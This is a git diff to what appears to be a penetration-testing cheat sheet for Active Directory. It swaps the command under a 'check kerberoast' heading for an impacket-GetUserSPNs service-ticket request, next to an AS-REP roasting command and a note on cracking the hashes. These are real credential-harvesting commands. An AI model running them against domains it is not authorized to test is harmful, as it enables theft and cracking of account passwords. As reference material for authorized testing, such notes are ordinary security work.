@@ -725,7 +725,7 @@ Login failed!"`
 - `python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>`
 
 ## check kerberoast
-- `python GetNPUsers.py VICTIM-DOMAIN/ -usersfile user.txt -dc-ip <IP> -format hashcat`
+- `impacket-GetUserSPNs '<domain>/<username>:<password>' -dc-ip <ip-of-domain-controller> -request`
 
 ## crack as_rep_response_file
 > search for hashcat / john
